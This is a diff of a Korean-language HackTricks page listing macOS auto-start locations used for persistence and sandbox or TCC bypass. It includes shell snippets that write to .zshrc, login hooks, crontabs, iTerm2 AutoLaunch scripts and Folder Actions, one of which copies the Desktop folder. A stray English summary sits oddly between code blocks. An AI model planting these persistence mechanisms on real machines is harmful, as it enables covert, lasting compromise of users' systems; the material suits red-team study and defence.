@@ -2,62 +2,62 @@
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅이 되는 AWS 해킹을 배우세요**!</summary>
+<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.
+- **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
+- **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
+- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
 
 </details>
 
-이 섹션은 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) 블로그 시리즈를 기반으로 하며, 목표는 **더 많은 Autostart 위치**를 추가하고(가능한 경우), 최신 macOS 버전(13.4)에서 **아직 작동하는 기술**을 나타내며 필요한 **권한**을 명시하는 것입니다.
+이 섹션은 [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) 블로그 시리즈를 기반으로 하며, 목표는 **더 많은 Autostart 위치**를 추가하고 (가능한 경우) **현재 macOS 최신 버전(13.4)에서 여전히 작동하는 기술**을 나타내며 **필요한 권한**을 명시하는 것입니다.
 
 ## 샌드박스 우회
 
 {% hint style="success" %}
-여기에서는 **sandbox 우회**에 유용한 시작 위치를 찾을 수 있습니다. 이를 통해 **파일에 작성**하고 매우 **일반적인** **동작**, 특정 **시간** 또는 **루트 권한이 필요하지 않은 샌드박스 내에서 일반적으로 수행할 수 있는 동작을 기다리는 것이 가능합니다.
+여기에서는 **sandbox 우회**에 유용한 시작 위치를 찾을 수 있습니다. 이를 통해 **파일에 작성**하고 매우 **일반적인 동작**, 특정 **시간** 또는 **루트 권한이 필요하지 않은 샌드박스 내에서 일반적으로 수행할 수 있는 동작**을 **기다리는** 것으로 간단히 무언가를 실행할 수 있습니다.
 {% endhint %}
 
 ### Launchd
 
-* 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
-* TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
+- 샌드박스 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
+- TCC 우회: [🔴](https://emojipedia.org/large-red-circle)
 
 #### 위치
 
-* **`/Library/LaunchAgents`**
-* **트리거**: 재부팅
-* 루트 권한 필요
-* **`/Library/LaunchDaemons`**
-* **트리거**: 재부팅
-* 루트 권한 필요
-* **`/System/Library/LaunchAgents`**
-* **트리거**: 재부팅
-* 루트 권한 필요
-* **`/System/Library/LaunchDaemons`**
-* **트리거**: 재부팅
-* 루트 권한 필요
-* **`~/Library/LaunchAgents`**
-* **트리거**: 다시 로그인
-* **`~/Library/LaunchDemons`**
-* **트리거**: 다시 로그인
+- **`/Library/LaunchAgents`**
+  - **트리거**: 재부팅
+  - 루트 권한 필요
+- **`/Library/LaunchDaemons`**
+  - **트리거**: 재부팅
+  - 루트 권한 필요
+- **`/System/Library/LaunchAgents`**
+  - **트리거**: 재부팅
+  - 루트 권한 필요
+- **`/System/Library/LaunchDaemons`**
+  - **트리거**: 재부팅
+  - 루트 권한 필요
+- **`~/Library/LaunchAgents`**
+  - **트리거**: 다시 로그인
+- **`~/Library/LaunchDemons`**
+  - **트리거**: 다시 로그인
 
-#### 설명 및 공격
+#### 설명 및 Exploitation
 
-**`launchd`**는 OX S 커널에서 부팅 시 처음으로 실행되는 프로세스이며 종료 시 가장 마지막에 종료됩니다. 항상 **PID 1**을 가져야 합니다. 이 프로세스는 다음 위치에 있는 **ASEP** **plist**에서 지정된 구성을 **읽고 실행**할 것입니다:
+**`launchd`**는 OX S 커널에서 부팅 시 처음 실행되는 **첫 번째 프로세스**이며 종료 시에는 마지막에 종료됩니다. 항상 **PID 1**을 가져야 합니다. 이 프로세스는 다음 위치에 있는 **ASEP plists**에서 지정된 구성을 **읽고 실행**할 것입니다:
 
-* `/Library/LaunchAgents`: 관리자가 설치한 사용자별 에이전트
-* `/Library/LaunchDaemons`: 관리자가 설치한 시스템 전역 데몬
-* `/System/Library/LaunchAgents`: Apple이 제공한 사용자별 에이전트
-* `/System/Library/LaunchDaemons`: Apple이 제공한 시스템 전역 데몬
+- `/Library/LaunchAgents`: 관리자가 설치한 사용자별 에이전트
+- `/Library/LaunchDaemons`: 관리자가 설치한 시스템 전역 데몬
+- `/System/Library/LaunchAgents`: Apple이 제공하는 사용자별 에이전트
+- `/System/Library/LaunchDaemons`: Apple이 제공하는 시스템 전역 데몬
 
-사용자가 로그인하면 `/Users/$USER/Library/LaunchAgents` 및 `/Users/$USER/Library/LaunchDemons`에 있는 plist가 **로그인한 사용자의 권한**으로 시작됩니다.
+사용자가 로그인하면 `/Users/$USER/Library/LaunchAgents` 및 `/Users/$USER/Library/LaunchDemons`에 있는 plists가 **로그인한 사용자의 권한**으로 시작됩니다.
 
-**에이전트와 데몬의 주요 차이점은 에이전트는 사용자가 로그인할 때 로드되고 데몬은 시스템 부팅 시 로드된다는 것**입니다(ssh와 같은 서비스는 시스템에 접근하기 전에 실행되어야 하기 때문). 또한 에이전트는 GUI를 사용할 수 있지만 데몬은 백그라운드에서 실행되어야 합니다.
+**에이전트와 데몬의 주요 차이점은 에이전트는 사용자가 로그인할 때 로드되고 데몬은 시스템 부팅 시 로드된다는 것**입니다(사용자가 시스템에 액세스하기 전에 ssh와 같은 서비스가 실행되어야 하는 경우가 있기 때문). 또한 에이전트는 GUI를 사용할 수 있지만 데몬은 백그라운드에서 실행되어야 합니다.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
@@ -83,18 +83,18 @@ HackTricks를 지원하는 다른 방법:
 **사용자 로그인 전에 실행되어야 하는 경우가 있는데, 이를 PreLoginAgents라고 합니다**. 예를 들어, 이는 로그인 시 보조 기술을 제공하는 데 유용합니다. 이러한 파일들은 `/Library/LaunchAgents`에서도 찾을 수 있습니다([여기](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)에서 예제 확인).
 
 {% hint style="info" %}
-새로운 데몬 또는 에이전트 구성 파일은 **다음 재부팅 후 또는** `launchctl load <target.plist>` **를 사용하여 로드됩니다.** `launchctl -F <file>`를 사용하여 확장자 없는 .plist 파일을 로드하는 것도 가능합니다(그러나 이러한 plist 파일들은 자동으로 재부팅 후 로드되지 않습니다).\
-`launchctl unload <target.plist>`를 사용하여 **로드를 해제**할 수도 있습니다(해당 프로세스는 종료됩니다).
+새로운 데몬 또는 에이전트 구성 파일은 **다음 재부팅 후 또는** `launchctl load <target.plist>`을 사용하여 **로드됩니다**. **확장자 없이 .plist 파일을 로드하는 것도 가능**합니다. `launchctl -F <file>` (그러나 이러한 plist 파일들은 자동으로 재부팅 후 로드되지 않습니다).\
+`launchctl unload <target.plist>`로 **언로드**하는 것도 가능합니다(해당 프로세스는 종료됩니다).
 
-**Agent** 또는 **Daemon**이 **실행되는 것을 방해하는 것(예: 재정의)이 없는지 확인**하려면 다음을 실행하십시오: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
+**Agent** 또는 **Daemon**이 **실행되는 것을 방해하는 것이 없는지 확인**하려면 다음을 실행하십시오: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
 {% endhint %}
 
-현재 사용자에 의해 로드된 모든 에이전트 및 데몬을 나열하십시오:
+현재 사용자에 의해 로드된 모든 에이전트와 데몬을 나열하십시오:
 ```bash
 launchctl list
 ```
 {% hint style="warning" %}
-만약 plist 파일이 사용자에 의해 소유되었다면, 데몬 시스템 전역 폴더에 있더라도 **작업은 사용자로 실행**되고 루트로 실행되지 않습니다. 이는 일부 권한 상승 공격을 방지할 수 있습니다.
+만약 plist 파일이 사용자에 의해 소유되었다면, 데몬 시스템 전역 폴더에 있더라도 **작업은 사용자로 실행**되며 루트로 실행되지 않습니다. 이는 일부 권한 상승 공격을 방지할 수 있습니다.
 {% endhint %}
 
 ### 쉘 시작 파일
@@ -104,7 +104,7 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 
 * 샌드박스 우회에 유용함: [✅](https://emojipedia.org/check-mark-button)
 * TCC 우회: [✅](https://emojipedia.org/check-mark-button)
-* 그러나 이 파일을 로드하는 쉘을 실행하는 TCC 우회를 가진 앱을 찾아야 함
+* 하지만 이 파일들을 로드하는 쉘을 실행하는 TCC 우회를 가진 앱을 찾아야 함
 
 #### 위치
 
@@ -118,19 +118,19 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 * **`/etc/zlogout`**
 * **트리거**: zsh로 터미널 종료
 * 루트 권한 필요
-* 가능한 추가 위치: **`man zsh`**
+* 추가 가능성 있음: **`man zsh`**
 * **`~/.bashrc`**
 * **트리거**: bash로 터미널 열기
 * `/etc/profile` (작동하지 않음)
 * `~/.profile` (작동하지 않음)
 * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
-* **트리거**: xterm으로 예상되지만 **설치되어 있지 않으며** 설치 후에도 이 오류가 발생함: xterm: `DISPLAY is not set`
+* **트리거**: xterm으로 예상되지만 **설치되어 있지 않음** 및 설치 후에도 이 오류가 발생함: xterm: `DISPLAY is not set`
 
 #### 설명 및 악용
 
 `zsh` 또는 `bash`와 같은 쉘 환경을 초기화할 때 **특정 시작 파일이 실행**됩니다. macOS는 현재 기본 쉘로 `/bin/zsh`를 사용합니다. 이 쉘은 터미널 애플리케이션이 시작될 때 또는 SSH를 통해 장치에 액세스할 때 자동으로 액세스됩니다. macOS에는 `bash`와 `sh`도 있지만 사용하려면 명시적으로 호출해야 합니다.
 
-우리가 **`man zsh`**로 읽을 수 있는 zsh의 매뉴얼 페이지에는 시작 파일에 대한 상세한 설명이 있습니다.
+우리가 **`man zsh`**로 읽을 수 있는 zsh의 매뉴얼 페이지에는 시작 파일에 대한 긴 설명이 있습니다.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
@@ -138,7 +138,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 ### 다시 열린 애플리케이션
 
 {% hint style="danger" %}
-지정된 악용을 구성하고 로그아웃 및 로그인 또는 심지어 재부팅을 해도 앱을 실행할 수 없었습니다. (앱이 실행되지 않았습니다. 아마도 이러한 작업이 수행될 때 실행 중이어야 할 수도 있습니다)
+지정된 악용을 구성하고 로그아웃 및 로그인 또는 재부팅하여 앱을 실행할 수 없었습니다. (앱이 실행되지 않았습니다. 이 작업을 수행할 때 앱이 실행 중이어야 할 수도 있습니다)
 {% endhint %}
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)
@@ -155,7 +155,7 @@ echo "touch /tmp/hacktricks" >> ~/.zshrc
 
 다시 열 애플리케이션은 모두 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 내에 있습니다.
 
-따라서 다시 열 애플리케이션을 자체 앱으로 실행하려면 **앱을 목록에 추가**하면 됩니다.
+따라서 다시 열 애플리케이션이 자체 앱을 시작하도록하려면 **앱을 목록에 추가**하면 됩니다.
 
 UUID는 해당 디렉토리를 나열하거나 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`로 찾을 수 있습니다.
 
@@ -179,14 +179,14 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 
 * 샌드박스 우회에 유용함: [✅](https://emojipedia.org/check-mark-button)
 * TCC 우회: [✅](https://emojipedia.org/check-mark-button)
-* 사용자가 FDA 권한을 가질 수 있도록 터미널 사용
+* 사용자가 터미널을 사용할 때 FDA 권한을 가짐
 
 #### 위치
 
 * **`~/Library/Preferences/com.apple.Terminal.plist`**
 * **트리거**: 터미널 열기
 
-#### 설명 및 악용
+#### 설명 및 공격
 
 **`~/Library/Preferences`**에는 사용자의 응용 프로그램 환경 설정이 저장됩니다. 이러한 환경 설정 중 일부는 **다른 응용 프로그램/스크립트를 실행**할 수 있는 구성을 보유할 수 있습니다.
 
@@ -210,7 +210,7 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 }
 [...]
 ```
-그래서 시스템의 터미널 환경 설정 파일(plist)을 덮어쓸 수 있다면, **`open`** 기능을 사용하여 **터미널을 열고 해당 명령이 실행**될 수 있습니다.
+그래서, 시스템의 터미널 환경 설정 파일(plist)이 덮어쓰여진다면, **`open`** 기능을 사용하여 **터미널을 열고 해당 명령이 실행**될 수 있습니다.
 
 다음 명령을 사용하여 CLI에서 이를 추가할 수 있습니다:
 
@@ -236,11 +236,11 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 * **어디서나**
 * **트리거**: 터미널 열기
 
-#### 설명 및 악용
+#### 설명 및 Exploitation
 
 [**`.terminal`** 스크립트](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)를 만들고 열면 **터미널 애플리케이션**이 자동으로 호출되어 거기에 표시된 명령을 실행합니다. 터미널 앱에 특별한 권한(예: TCC)이 있는 경우 명령이 해당 특별한 권한으로 실행됩니다.
 
-다음과 같이 시도해보세요:
+다음과 함께 시도해보세요:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -293,7 +293,7 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 #### 설명
 
-이전의 글들에 따르면 **일부 오디오 플러그인을 컴파일**하고 로드할 수 있습니다.
+이전의 글에서 **일부 오디오 플러그인을 컴파일**하고 로드할 수 있다고 합니다.
 
 ### QuickLook 플러그인
 
@@ -320,7 +320,7 @@ QuickLook 플러그인은 **파일 미리보기를 트리거**할 때(파인더�
 ### ~~로그인/로그아웃 후크~~
 
 {% hint style="danger" %}
-나에게는 작동하지 않았습니다. 사용자 LoginHook이나 루트 LogoutHook도 작동하지 않았습니다.
+나에게는 작동하지 않았습니다. 사용자 LoginHook이나 루트 LogoutHook 모두 작동하지 않았습니다.
 {% endhint %}
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
@@ -330,10 +330,10 @@ QuickLook 플러그인은 **파일 미리보기를 트리거**할 때(파인더�
 
 #### 위치
 
-* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`와 같은 것을 실행할 수 있어야 함
+* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`와 같은 명령을 실행할 수 있어야 함
 * `~/Library/Preferences/com.apple.loginwindow.plist`에 위치함
 
-이러한 후크는 폐기되었지만 사용자가 로그인할 때 명령을 실행할 수 있습니다.
+이러한 후크는 사용자가 로그인할 때 명령을 실행할 수 있도록 사용되지만 사용이 중단되었지만 여전히 사용할 수 있습니다.
 ```bash
 cat > $HOME/hook.sh << EOF
 #!/bin/bash
@@ -365,7 +365,7 @@ defaults delete com.apple.loginwindow LogoutHook
 ## 조건부 샌드박스 우회
 
 {% hint style="success" %}
-여기에서는 **샌드박스 우회**에 유용한 시작 위치를 찾을 수 있습니다. 이를 통해 **파일에 쓰고** 특정 **프로그램이 설치되어 있거나 "일반적이지 않은" 사용자** 조치 또는 환경과 같이 **매우 흔하지 않은 조건**을 기대하지 않고 간단히 무언가를 실행할 수 있습니다.
+여기에서는 **샌드박스 우회**에 유용한 시작 위치를 찾을 수 있습니다. 이를 통해 **파일에 쓰기**만으로 **특정 프로그램이 설치되어 있거나, "일반적이지 않은" 사용자** 조치 또는 환경과 같은 **매우 흔하지 않은 조건**을 기대하지 않고도 무언가를 간단히 실행할 수 있습니다.
 {% endhint %}
 
 ### 크론
@@ -389,14 +389,14 @@ defaults delete com.apple.loginwindow LogoutHook
 ```bash
 crontab -l
 ```
-맥OS에서는 **`/usr/lib/cron/tabs/`** 및 **`/var/at/tabs/`**에서 사용자의 모든 cron 작업을 볼 수 있습니다 (루트 권한 필요).
+맥OS에서는 **`/usr/lib/cron/tabs/`** 및 **`/var/at/tabs/`** (루트 권한 필요)에 사용자의 모든 cron 작업을 볼 수 있습니다.
 
 맥OS에서는 일정한 빈도로 스크립트를 실행하는 여러 폴더를 다음 위치에서 찾을 수 있습니다:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
-다음에서는 일반 **cron** **작업**, **at** **작업** (거의 사용되지 않음) 및 **주기적** **작업** (주로 임시 파일을 정리하는 데 사용됨)을 찾을 수 있습니다. 매일 주기적 작업은 다음과 같이 실행할 수 있습니다: `periodic daily`.
+여기에서는 일반 **cron** **작업**, **at** **작업** (거의 사용되지 않음), 그리고 **주기적 작업** (주로 임시 파일을 정리하는 데 사용됨)을 찾을 수 있습니다. 매일 주기적 작업은 다음과 같이 실행할 수 있습니다: `periodic daily`.
 
 **사용자 cron 작업을 프로그래밍적으로 추가**하려면 다음을 사용할 수 있습니다:
 ```bash
@@ -409,7 +409,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.
 
 * 유용한 샌드박스 우회: [✅](https://emojipedia.org/check-mark-button)
 * TCC 우회: [✅](https://emojipedia.org/check-mark-button)
-* iTerm2는 TCC 권한을 부여했던 적이 있습니다.
+* iTerm2는 TCC 권한을 부여했었습니다.
 
 #### 위치
 
@@ -431,23 +431,19 @@ EOF
 
 chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
 ```
-## macOS Auto Start Locations
+### macOS Auto Start Locations
 
-### Launch Agents
+macOS provides several locations where applications can be configured to automatically start when a user logs in. These locations include:
 
-Launch agents are used to run processes when a user logs in. They are stored in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.
+1. **Login Items**: Found in System Preferences > Users & Groups, this is the most common way for applications to start at login. Users can add or remove applications from this list.
 
-### Launch Daemons
+2. **Launch Agents**: These are user-specific agents that run when a user logs in. They are usually found in `~/Library/LaunchAgents/`.
 
-Launch daemons are used to run processes at system boot or login. They are stored in `/Library/LaunchDaemons/`.
+3. **Launch Daemons**: These are system-wide daemons that run regardless of which user is logged in. They are typically found in `/Library/LaunchDaemons/`.
 
-### Login Items
+4. **Startup Items**: Deprecated since macOS 10.7, Startup Items used to be a common way to launch daemons or agents at boot. They were stored in `/Library/StartupItems/`.
 
-Login items are applications that open when a user logs in. They can be managed in `System Preferences > Users & Groups > Login Items`.
-
-### Startup Items
-
-Startup items are legacy items that automatically launch when a user logs in. They are stored in `/Library/StartupItems/`.
+To improve security, it is recommended to regularly review and remove unnecessary applications from these auto-start locations.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -468,11 +464,11 @@ EOF
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-iTerm2 환경 설정은 **`~/Library/Preferences/com.googlecode.iterm2.plist`**에 위치하며, iTerm2 터미널이 열릴 때 **실행할 명령을 나타낼 수 있습니다**.
+iTerm2 환경 설정은 **`~/Library/Preferences/com.googlecode.iterm2.plist`**에 위치하며, iTerm2 터미널이 열릴 때 **실행할 명령을 나타낼 수 있습니다.**
 
 이 설정은 iTerm2 설정에서 구성할 수 있습니다:
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
 
 그리고 해당 명령은 환경 설정에 반영됩니다:
 ```bash
@@ -545,7 +541,7 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 [**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)은 **macOS**용 자동화 플랫폼으로, 작업에 **LUA 스크립팅 언어**를 활용합니다. 특히, 완전한 AppleScript 코드의 통합과 셸 스크립트의 실행을 지원하여 스크립팅 기능을 크게 향상시킵니다.
 
-이 앱은 단일 파일인 `~/.hammerspoon/init.lua`를 찾고, 시작되면 해당 스크립트가 실행됩니다.
+이 앱은 단일 파일인 `~/.hammerspoon/init.lua`를 찾으며, 시작되면 해당 스크립트가 실행됩니다.
 ```bash
 mkdir -p "$HOME/.hammerspoon"
 cat > "$HOME/.hammerspoon/init.lua" << EOF
@@ -563,7 +559,7 @@ EOF
 
 * `~/Library/Application Support/BetterTouchTool/*`
 
-이 도구는 일부 단축키가 눌렸을 때 실행할 애플리케이션 또는 스크립트를 지정할 수 있습니다. 공격자는 임의의 코드를 실행하도록 **자신만의 단축키 및 작업을 데이터베이스에 설정**할 수 있어서 (단축키는 키를 누르는 것만으로도 가능합니다).
+이 도구는 일부 단축키가 눌렸을 때 실행할 애플리케이션 또는 스크립트를 지정할 수 있습니다. 공격자는 임의의 코드를 실행하도록 **자신만의 단축키 및 작업을 데이터베이스에 설정**할 수 있어서 임의 코드를 실행할 수 있습니다 (단축키는 키를 누르는 것만으로도 가능합니다).
 
 ### Alfred
 
@@ -604,7 +600,7 @@ sudo systemsetup -setremotelogin on
 
 #### 설명 및 Exploitation
 
-기본적으로 `/etc/ssh/sshd_config`에서 `PermitUserRC no`가 아닌 경우, 사용자가 **SSH를 통해 로그인**할 때 **`/etc/ssh/sshrc`** 및 **`~/.ssh/rc`** 스크립트가 실행됩니다.
+기본적으로 `/etc/ssh/sshd_config`에서 `PermitUserRC no`가 아닌 경우, 사용자가 **SSH를 통해 로그인**할 때 스크립트 **`/etc/ssh/sshrc`** 및 **`~/.ssh/rc`**가 실행됩니다.
 
 ### **로그인 항목**
 
@@ -618,7 +614,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.
 
 * **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 * **트리거:** 로그인
-* **`osascript`**를 호출하여 저장된 Exploit 페이로드
+* Exploit 페이로드는 **`osascript`**를 호출하여 저장됨
 * **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
 * **트리거:** 로그인
 * 루트 권한 필요
@@ -645,7 +641,7 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 
 (로그인 항목에 대한 이전 섹션을 확인하십시오. 이것은 확장입니다)
 
-**ZIP** 파일을 **로그인 항목**으로 저장하면 **`Archive Utility`**가 열리고, 예를 들어 **`~/Library`**에 저장된 ZIP 파일이 **`LaunchAgents/file.plist`** 폴더를 포함하고 있고 해당 폴더에 백도어가 포함되어 있다면 (기본적으로는 그렇지 않음), 해당 폴더가 생성되고 plist가 추가되어 다음에 사용자가 다시 로그인할 때 **plist에 표시된 백도어가 실행**됩니다.
+**ZIP** 파일을 **로그인 항목**으로 저장하면 **`Archive Utility`**가 열리고, 예를 들어 **`~/Library`**에 저장된 ZIP이 **`LaunchAgents/file.plist`** 폴더를 포함하고 있고 해당 폴더에 백도어가 포함되어 있다면 (기본적으로는 그렇지 않음), 해당 폴더가 생성되고 plist가 추가되어 다음에 사용자가 다시 로그인할 때 **plist에 표시된 백도어가 실행**됩니다.
 
 다른 옵션으로는 사용자 홈 디렉토리 내에 **`.bash_profile`** 및 **`.zshenv`** 파일을 생성하는 것이며, LaunchAgents 폴더가 이미 존재하는 경우에도 이 기술이 여전히 작동할 것입니다.
 
@@ -663,7 +659,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.
 
 #### **설명**
 
-`at` 작업은 **특정 시간에 실행되는 일회성 작업**을 예약하는 데 사용됩니다. cron 작업과 달리 `at` 작업은 실행 후 자동으로 제거됩니다. 이러한 작업은 시스템 재부팅 후에도 지속되므로 특정 조건 하에서 잠재적인 보안 문제로 표시됩니다.
+`at` 작업은 **특정 시간에 실행되는 일회성 작업**을 예약하는 데 사용됩니다. cron 작업과 달리 `at` 작업은 실행 후 자동으로 제거됩니다. 이러한 작업은 시스템 재부팅 후에도 지속되므로 특정 조건에서 보안 문제가 될 수 있음을 주의해야 합니다.
 
 **기본적으로** 비활성화되어 있지만 **루트** 사용자는 다음과 같이 **활성화**할 수 있습니다:
 ```bash
@@ -679,7 +675,7 @@ sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-위에서 두 개의 예약된 작업을 볼 수 있습니다. `at -c JOBNUMBER`를 사용하여 작업의 세부 정보를 출력할 수 있습니다.
+위에서 두 개의 작업이 예약되어 있는 것을 볼 수 있습니다. `at -c JOBNUMBER`를 사용하여 작업의 세부 정보를 출력할 수 있습니다.
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -725,29 +721,29 @@ total 32
 ```
 파일 이름에는 대기열, 작업 번호 및 예약된 실행 시간이 포함되어 있습니다. 예를 들어 `a0001a019bdcd2`를 살펴보겠습니다.
 
-- `a` - 이것은 대기열을 나타냅니다.
-- `0001a` - 16진수로 된 작업 번호, `0x1a = 26`
-- `019bdcd2` - 16진수로 된 시간. 이는 epoch 이후 경과된 분을 나타냅니다. `0x019bdcd2`는 10진수로 `26991826`입니다. 이를 60으로 곱하면 `1619509560`이 되며, 이는 `GMT: 2021년 4월 27일 화요일 7시 46분 00초`입니다.
+* `a` - 이것은 대기열입니다.
+* `0001a` - 16진수로 된 작업 번호, `0x1a = 26`
+* `019bdcd2` - 16진수로 된 시간. 이는 epoch 이후 경과된 분을 나타냅니다. `0x019bdcd2`는 10진수로 `26991826`입니다. 이를 60으로 곱하면 `1619509560`이 되며, 이는 `GMT: 2021년 4월 27일 화요일 7시 46분 00초`입니다.
 
-작업 파일을 출력하면 `at -c`를 사용하여 얻은 정보와 동일한 정보가 포함되어 있습니다.
+작업 파일을 출력하면 `at -c`를 사용하여 얻은 정보와 동일한 정보가 포함되어 있음을 알 수 있습니다.
 
 ### 폴더 액션
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
 Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
-- 샌드박스 우회에 유용함: [✅](https://emojipedia.org/check-mark-button)
-- 그러나 **`System Events`**에 연락하기 위해 `osascript`를 인수와 함께 호출할 수 있어야 함
-- TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
-- 데스크톱, 문서 및 다운로드와 같은 일부 기본 TCC 권한이 있음
+* 샌드박스 우회에 유용함: [✅](https://emojipedia.org/check-mark-button)
+* 그러나 **`System Events`**에 연락하기 위해 `osascript`를 인수와 함께 호출할 수 있어야 함
+* TCC 우회: [🟠](https://emojipedia.org/large-orange-circle)
+* 데스크톱, 문서 및 다운로드와 같은 일부 기본 TCC 권한이 있음
 
 #### 위치
 
-- **`/Library/Scripts/Folder Action Scripts`**
-- 루트 권한 필요
-- **트리거**: 지정된 폴더에 액세스
-- **`~/Library/Scripts/Folder Action Scripts`**
-- **트리거**: 지정된 폴더에 액세스
+* **`/Library/Scripts/Folder Action Scripts`**
+* 루트 권한 필요
+* **트리거**: 지정된 폴더에 액세스
+* **`~/Library/Scripts/Folder Action Scripts`**
+* **트리거**: 지정된 폴더에 액세스
 
 #### 설명 및 악용
 
@@ -757,8 +753,8 @@ Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-89
 
 1. [Automator](https://support.apple.com/guide/automator/welcome/mac)를 사용하여 폴더 액션 워크플로우를 만들고 서비스로 설치하는 것
 2. 폴더의 컨텍스트 메뉴에서 폴더 액션 설정을 통해 스크립트를 수동으로 첨부하는 것
-3. 시스템적으로 폴더 액션을 설정하기 위해 `System Events.app`로 Apple 이벤트 메시지를 보내기 위해 OSAScript를 활용하는 것
-- 이 방법은 특히 시스템에 작업을 포함하여 지속성 수준을 제공하는 데 유용합니다.
+3. `System Events.app`로 Apple 이벤트 메시지를 보내기 위해 OSAScript를 활용하여 폴더 액션을 프로그래밍적으로 설정하는 것
+* 이 방법은 특히 시스템에 작업을 포함하여 지속성 수준을 제공하는 데 유용합니다.
 
 다음 스크립트는 폴더 액션에서 실행할 수 있는 예시입니다:
 ```applescript
@@ -774,7 +770,7 @@ app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
